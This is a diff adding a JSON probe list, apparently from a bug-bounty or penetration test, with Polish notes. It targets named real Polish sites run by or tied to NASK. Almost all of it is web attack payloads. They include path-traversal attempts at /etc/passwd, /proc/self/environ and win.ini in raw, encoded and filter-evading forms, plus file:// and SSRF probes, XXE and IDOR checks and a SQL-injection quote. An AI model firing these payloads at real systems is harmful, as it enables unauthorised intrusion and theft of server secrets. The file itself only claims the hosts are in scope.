@@ -1,0 +1,155 @@
+{
+  "run": "004",
+  "note": "Wave 1: parametr sterujacy sciezka/URL-em. Wszystkie zadania GET, read-only, hosts z zakresu programu. Kazda sonda ma hipoteze w polu note.",
+  "probes": [
+    {
+      "id": "bm-control",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=/media/2026/10/NASK_poradnik-IoT.pdf",
+      "note": "kontrola: endpoint czyta plik z dysku po sciezce (potwierdzone: zwraca PDF)",
+      "snippet": true
+    },
+    {
+      "id": "bm-abs-passwd",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=/etc/passwd",
+      "note": "sciezka absolutna: 'File not found' -> sciezka jest doklejana do katalogu mediow"
+    },
+    {
+      "id": "bm-dotdot-raw",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=../../../../etc/passwd",
+      "note": "traversal surowy: odrzucony przez walidacje"
+    },
+    {
+      "id": "bm-dotdot-enc",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "note": "traversal w pelni zakodowany: jesli filtr patrzy na surowy string, przejdzie"
+    },
+    {
+      "id": "bm-dotdot-halfenc",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "note": "traversal z zakodowanym tylko separatorem"
+    },
+    {
+      "id": "bm-dotdot-double",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "note": "podwojne kodowanie: dziala, gdy dekodowanie nastepuje dwa razy"
+    },
+    {
+      "id": "bm-dotdot-dotslash",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=....//....//....//....//etc/passwd",
+      "note": "obejscie filtra usuwajacego '../' jednokrotnie"
+    },
+    {
+      "id": "bm-backslash",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+      "note": "wariant Windows: host na Azure, katalog mediow moze byc na Windows"
+    },
+    {
+      "id": "bm-media-traversal",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=/media/../../../../etc/passwd",
+      "note": "sciezka zaczynajaca sie poprawnie, traversal po prefiksie"
+    },
+    {
+      "id": "bm-proc-environ",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=/media/../../../../proc/self/environ",
+      "note": "jesli traversal dziala, /proc/self/environ ujawnia zmienne srodowiska (sekrety)"
+    },
+    {
+      "id": "bm-file-scheme",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=file:///etc/passwd",
+      "note": "schemat file:// - inna sciezka obslugi URL"
+    },
+    {
+      "id": "bm-ssrf-public",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=https://science.nask.pl/robots.txt",
+      "note": "SSRF: jesli serwer pobiera zdalny URL, zwroci robots.txt innego hosta z zakresu"
+    },
+    {
+      "id": "bm-ssrf-scheme-relative",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=//science.nask.pl/robots.txt",
+      "note": "SSRF bez jawnego schematu"
+    },
+    {
+      "id": "sci-control",
+      "url": "https://science.nask.pl/api/media/wp-content/uploads/sites/4/2023/06/Struktura-s-e1687258346784.jpg",
+      "note": "kontrola: /api/media/<sciezka> serwuje plik z katalogu uploads"
+    },
+    {
+      "id": "sci-traversal-raw",
+      "url": "https://science.nask.pl/api/media/../../../../etc/passwd",
+      "note": "path traversal przez proxy mediow"
+    },
+    {
+      "id": "sci-traversal-enc",
+      "url": "https://science.nask.pl/api/media/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+      "note": "path traversal zakodowany"
+    },
+    {
+      "id": "sci-traversal-dotslash",
+      "url": "https://science.nask.pl/api/media/....//....//....//....//etc/passwd",
+      "note": "obejscie filtra usuwajacego '../' jednokrotnie"
+    },
+    {
+      "id": "sci-abs",
+      "url": "https://science.nask.pl/api/media//etc/passwd",
+      "note": "podwojny slash: czesto lamie konkatenacje base+sciezka"
+    },
+    {
+      "id": "dns-whois-xml",
+      "url": "https://dns.pl/api/who-is-xml/",
+      "note": "endpoint XML: sprawdzic, czy przyjmuje parametr i czy odbija bledy parsera (XXE/injection)",
+      "snippet": true
+    },
+    {
+      "id": "dns-whois-xml-domain",
+      "url": "https://dns.pl/api/who-is-xml/?domain=nask.pl",
+      "note": "parametr domain: sprawdzic format odpowiedzi i walidacje",
+      "snippet": true
+    },
+    {
+      "id": "dns-domain-browser",
+      "url": "https://dns.pl/api/domain-browser/",
+      "note": "publiczne API listy domen: sprawdzic, czy przyjmuje parametry wyszukiwania",
+      "snippet": true
+    },
+    {
+      "id": "dns-stats",
+      "url": "https://dns.pl/api/stats/",
+      "note": "statystyki: sprawdzic zakres ujawnianych danych",
+      "snippet": true
+    },
+    {
+      "id": "dns-funny-name",
+      "url": "https://dns.pl/api/funny-name/",
+      "note": "endpoint o niejasnej funkcji: sprawdzic zachowanie bez parametrow",
+      "snippet": true
+    },
+    {
+      "id": "sos-announcements",
+      "url": "https://116sos.pl/api/announcements",
+      "note": "API ogloszen: sprawdzic, czy zwraca dane i czy przyjmuje filtry",
+      "snippet": true
+    },
+    {
+      "id": "sos-cookie-hash",
+      "url": "https://116sos.pl/api/fetch-cookie-hash",
+      "note": "nazwa sugeruje odczyt/zapis hash z cookie: sprawdzic, co zwraca bez ciasteczka",
+      "snippet": true
+    },
+    {
+      "id": "sos-og-image",
+      "url": "https://116sos.pl/api/og-image?imageId=1",
+      "note": "generator obrazkow po imageId: potencjalny IDOR lub traversal w parametrze",
+      "snippet": true
+    },
+    {
+      "id": "sos-og-image-traversal",
+      "url": "https://116sos.pl/api/og-image?imageId=../../../../etc/passwd",
+      "note": "ten sam parametr jako sciezka pliku"
+    },
+    {
+      "id": "sos-og-image-quote",
+      "url": "https://116sos.pl/api/og-image?imageId=1'",
+      "note": "pojedynczy apostrof: minimalna sonda bledu SQL (tylko odczyt, bez modyfikacji)"
+    }
+  ]
+}
